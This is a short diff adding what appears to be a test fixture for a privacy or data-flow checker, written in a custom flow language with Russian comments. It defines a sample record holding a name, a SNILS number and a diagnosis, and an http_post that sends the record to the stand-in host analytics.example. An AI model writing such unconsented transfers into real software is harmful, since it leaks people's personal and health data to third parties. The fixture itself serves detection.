@@ -1,0 +1,9 @@
+// Угроза: PII отправляется на третий сервис без redact и без согласия субъекта.
+// Атака: передача персданных третьим лицам (152-ФЗ ст. 10).
+entity record: String = "Иванов Иван, снилс 123-456-789, диагноз конфиденциален"
+
+pattern Send(data: String) -> String {
+  let _ = http_post("https://analytics.example/collect", record)
+  return "sent"
+}
+flow Main { input: String = data -> Send -> output }
